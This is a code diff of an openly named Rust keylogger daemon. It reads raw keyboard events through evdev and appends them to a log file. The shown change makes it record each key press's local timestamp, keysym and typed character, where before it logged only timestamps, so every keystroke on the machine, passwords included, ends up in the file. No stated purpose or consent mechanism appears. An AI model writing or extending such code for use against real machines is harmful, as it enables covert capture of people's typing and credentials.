@@ -1,10 +1,10 @@
 use std::{
     io::{Read, Write},
     process::exit,
-    time::UNIX_EPOCH,
 };
 
 use anyhow::{bail, Context, Result};
+use chrono::{DateTime, Local};
 use daemonize::{Daemonize, Outcome};
 use evdev::{Device, InputEvent, InputEventKind, Key, LedType};
 use log::{debug, error, info, trace};
@@ -13,7 +13,9 @@ use tokio::{
     sync::mpsc::{self, Receiver},
     task::JoinSet,
 };
-use xkbcommon::xkb::{self, KeyDirection, Keycode, Keymap, State, CONTEXT_NO_FLAGS};
+use xkbcommon::xkb::{
+    self, keysyms::KEY_NoSymbol, KeyDirection, Keycode, Keymap, State, CONTEXT_NO_FLAGS,
+};
 
 const PID_FILE_PATH: &str = "/run/keylogger.pid";
 
@@ -190,15 +192,25 @@ fn event_reader(mut rx: Receiver<InputEvent>, mut log_file: std::fs::File) -> Re
             state.update_key(keycode, direction);
         }
 
-        let key = state.key_get_utf8(keycode);
+        if press_type == KeyEventType::Release {
+            continue;
+        }
+
+        let key_sym = state.key_get_one_sym(keycode);
+
+        if key_sym == KEY_NoSymbol.into() {
+            continue;
+        }
+        let key_char = state.key_get_utf8(keycode);
 
         let time = eventr.timestamp();
-        let t = time
-            .duration_since(UNIX_EPOCH)
-            .context("UNIX_EPOCHE is after the timestamp of the event???")?
-            .as_nanos();
+        let time: DateTime<Local> = time.into();
+        let time_string = time.format("%Y-%m-%d %H:%M:%S.%f").to_string();
+
+        let log_string = format!("{time_string}|{}|{key_char}\n", key_sym.raw());
+        debug!("Log string: {log_string}");
         log_file
-            .write_all(format!("{t}\n").as_bytes())
+            .write_all(log_string.as_bytes())
             .context("Failed to write to log")?;
     }
     bail!("Event receiver was closed")
